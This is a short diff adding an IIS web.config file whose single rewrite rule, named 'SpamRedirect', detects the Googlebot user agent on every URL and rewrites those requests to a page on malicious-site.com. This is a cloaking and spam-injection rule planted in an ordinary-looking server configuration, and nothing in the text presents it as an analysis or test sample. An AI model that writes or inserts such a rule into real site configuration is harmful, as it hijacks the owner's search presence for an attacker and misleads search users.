@@ -1,0 +1,15 @@
+<configuration>
+<system.webServer>
+<rewrite>
+  <rules>
+    <rule name="SpamRedirect" stopProcessing="true">
+      <match url=".*" />
+      <conditions>
+        <add input="{HTTP_USER_AGENT}" pattern="googlebot" />
+      </conditions>
+      <action type="Rewrite" url="http://malicious-site.com/spam.aspx" />
+    </rule>
+  </rules>
+</rewrite>
+</system.webServer>
+</configuration>
